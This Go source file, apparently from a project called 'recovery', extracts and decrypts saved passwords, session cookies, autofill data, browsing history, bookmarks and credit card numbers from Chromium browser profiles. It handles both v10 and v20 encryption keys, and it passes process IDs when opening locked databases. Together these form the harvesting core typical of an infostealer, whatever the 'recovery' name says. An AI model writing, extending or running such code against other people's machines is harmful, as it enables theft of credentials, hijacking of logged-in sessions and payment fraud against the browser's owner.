package chromium

import (
	"database/sql"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strings"

	"recovery/recovery/crypto"
	"recovery/recovery/db"
	"recovery/recovery/types"
)

const HistoryLimit = 5000

func ExtractPasswords(profile types.ProfileInfo, cfg types.BrowserConfig, keys *types.ResolvedKeys, pids []uint32) []types.PasswordResult {
	var results []types.PasswordResult

	for _, dbFile := range []string{"Login Data", "Login Data For Account"} {
		dbPath := filepath.Join(profile.Path, dbFile)
		if _, err := os.Stat(dbPath); err != nil {
			continue
		}
		d, err := db.OpenDatabase(dbPath, pids)
		if err != nil {
			continue
		}

		rows, err := d.Query("SELECT origin_url, username_value, password_value FROM logins")
		if err != nil {
			d.Close()
			continue
		}
		for rows.Next() {
			var url, username sql.NullString
			var passwordBlob []byte
			rows.Scan(&url, &username, &passwordBlob)
			password := crypto.DecryptChromiumBlob(passwordBlob, keys.V10, keys.V20)
			if url.String != "" && (username.String != "" || password != "") {
				results = append(results, types.PasswordResult{
					URL:      url.String,
					Username: username.String,
					Password: password,
					Browser:  cfg.Name,
					Profile:  profile.Name,
				})
			}
		}
		rows.Close()
		d.Close()
	}

	return results
}

func ExtractCookies(profile types.ProfileInfo, cfg types.BrowserConfig, keys *types.ResolvedKeys, pids []uint32) []types.CookieResult {
	dbPath := filepath.Join(profile.Path, "Network", "Cookies")
	if _, err := os.Stat(dbPath); err != nil {
		dbPath = filepath.Join(profile.Path, "Cookies")
		if _, err := os.Stat(dbPath); err != nil {
			return nil
		}
	}

	d, err := db.OpenDatabase(dbPath, pids)
	if err != nil {
		return nil
	}
	defer d.Close()

	rows, err := d.Query("SELECT host_key, name, path, is_secure, is_httponly, expires_utc, encrypted_value, value FROM cookies")
	if err != nil {
		return nil
	}
	defer rows.Close()

	var results []types.CookieResult
	for rows.Next() {
		var host, name, path, plainValue sql.NullString
		var secure, httpOnly sql.NullBool
		var expiresUTC sql.NullInt64
		var encryptedValue []byte

		rows.Scan(&host, &name, &path, &secure, &httpOnly, &expiresUTC, &encryptedValue, &plainValue)
		value := crypto.DecryptChromiumBlob(encryptedValue, keys.V10, keys.V20)
		if value == "" {
			value = plainValue.String
		}
		results = append(results, types.CookieResult{
			Host:       host.String,
			Name:       name.String,
			Value:      value,
			Path:       path.String,
			Secure:     secure.Bool,
			HTTPOnly:   httpOnly.Bool,
			ExpiresUTC: expiresUTC.Int64,
			Browser:    cfg.Name,
			Profile:    profile.Name,
		})
	}
	return results
}

func ExtractAutofill(profile types.ProfileInfo, cfg types.BrowserConfig, pids []uint32) []types.AutofillResult {
	dbPath := filepath.Join(profile.Path, "Web Data")
	if _, err := os.Stat(dbPath); err != nil {
		return nil
	}
	d, err := db.OpenDatabase(dbPath, pids)
	if err != nil {
		return nil
	}
	defer d.Close()

	queries := []string{
		"SELECT name, value, date_created, count FROM autofill",
		"SELECT name, value, count FROM autofill",
		"SELECT name, value FROM autofill",
	}

	var results []types.AutofillResult
	for _, q := range queries {
		rows, err := d.Query(q)
		if err != nil {
			continue
		}
		for rows.Next() {
			var name, value sql.NullString
			var dateCreated, count sql.NullInt64
			switch len(strings.Split(q, ",")) {
			case 4:
				rows.Scan(&name, &value, &dateCreated, &count)
			case 3:
				rows.Scan(&name, &value, &count)
			default:
				rows.Scan(&name, &value)
			}
			if name.String != "" {
				results = append(results, types.AutofillResult{
					Name:        name.String,
					Value:       value.String,
					DateCreated: dateCreated.Int64,
					Browser:     cfg.Name,
					Profile:     profile.Name,
				})
			}
		}
		rows.Close()
		if len(results) > 0 {
			break
		}
	}
	return results
}

func ExtractHistory(profile types.ProfileInfo, cfg types.BrowserConfig, pids []uint32) []types.HistoryResult {
	dbPath := filepath.Join(profile.Path, "History")
	if _, err := os.Stat(dbPath); err != nil {
		return nil
	}
	d, err := db.OpenDatabase(dbPath, pids)
	if err != nil {
		return nil
	}
	defer d.Close()

	queries := []string{
		fmt.Sprintf("SELECT u.url, u.title, v.visit_time, v.transition, v.visit_duration FROM visits v JOIN urls u ON u.id = v.url ORDER BY v.visit_time DESC LIMIT %d", HistoryLimit),
		fmt.Sprintf("SELECT u.url, u.title, v.visit_time, v.transition FROM visits v JOIN urls u ON u.id = v.url ORDER BY v.visit_time DESC LIMIT %d", HistoryLimit),
	}

	var results []types.HistoryResult
	for _, q := range queries {
		rows, err := d.Query(q)
		if err != nil {
			continue
		}
		for rows.Next() {
			var url, title sql.NullString
			var visitTime sql.NullInt64
			var transition, duration sql.NullInt64

			if strings.Contains(q, "visit_duration") {
				rows.Scan(&url, &title, &visitTime, &transition, &duration)
			} else {
				rows.Scan(&url, &title, &visitTime, &transition)
			}

			var visitTimeUnix int64
			if visitTime.Int64 > 0 {
				visitTimeUnix = (visitTime.Int64 - 11644473600000000) / 1000000
			}
			if url.String != "" {
				results = append(results, types.HistoryResult{
					URL:           url.String,
					Title:         title.String,
					VisitTimeUnix: visitTimeUnix,
					VisitCount:    duration.Int64,
					Browser:       cfg.Name,
					Profile:       profile.Name,
				})
			}
		}
		rows.Close()
		if len(results) > 0 {
			break
		}
	}
	return results
}

func ExtractBookmarks(profile types.ProfileInfo, cfg types.BrowserConfig) []types.BookmarkResult {
	bookmarkPath := filepath.Join(profile.Path, "Bookmarks")
	data, err := os.ReadFile(bookmarkPath)
	if err != nil {
		return nil
	}

	var bookmarkData map[string]interface{}
	if err := json.Unmarshal(data, &bookmarkData); err != nil {
		return nil
	}

	var results []types.BookmarkResult
	if roots, ok := bookmarkData["roots"].(map[string]interface{}); ok {
		walkBookmarkNode(roots, cfg.Name, profile.Name, &results)
	}
	return results
}

func walkBookmarkNode(node map[string]interface{}, browser, profileName string, results *[]types.BookmarkResult) {
	for _, key := range []string{"bookmark_bar", "other", "synced"} {
		if child, ok := node[key].(map[string]interface{}); ok {
			walkBookmarkChildren(child, browser, profileName, results)
		}
	}
}

func walkBookmarkChildren(node map[string]interface{}, browser, profileName string, results *[]types.BookmarkResult) {
	children, ok := node["children"].([]interface{})
	if !ok {
		return
	}
	for _, c := range children {
		child, ok := c.(map[string]interface{})
		if !ok {
			continue
		}
		switch child["type"] {
		case "url":
			name, _ := child["name"].(string)
			url, _ := child["url"].(string)
			if url != "" {
				*results = append(*results, types.BookmarkResult{
					Name:    name,
					URL:     url,
					Type:    "url",
					Browser: browser,
					Profile: profileName,
				})
			}
		case "folder":
			walkBookmarkChildren(child, browser, profileName, results)
		}
	}
}

func ExtractCreditCards(profile types.ProfileInfo, cfg types.BrowserConfig, keys *types.ResolvedKeys, pids []uint32) []types.CreditCardResult {
	dbPath := filepath.Join(profile.Path, "Web Data")
	if _, err := os.Stat(dbPath); err != nil {
		return nil
	}
	d, err := db.OpenDatabase(dbPath, pids)
	if err != nil {
		return nil
	}
	defer d.Close()

	rows, err := d.Query("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, nickname FROM credit_cards")
	if err != nil {
		return nil
	}
	defer rows.Close()

	var results []types.CreditCardResult
	for rows.Next() {
		var name, nickname sql.NullString
		var expMonth, expYear sql.NullInt64
		var encrypted []byte
		rows.Scan(&name, &expMonth, &expYear, &encrypted, &nickname)

		cardNumber := crypto.DecryptChromiumBlob(encrypted, keys.V10, keys.V20)
		if name.String != "" || cardNumber != "" {
			results = append(results, types.CreditCardResult{
				NameOnCard:      name.String,
				ExpirationMonth: int(expMonth.Int64),
				ExpirationYear:  int(expYear.Int64),
				CardNumber:      cardNumber,
				Nickname:        nickname.String,
				Browser:         cfg.Name,
				Profile:         profile.Name,
			})
		}
	}
	return results
}
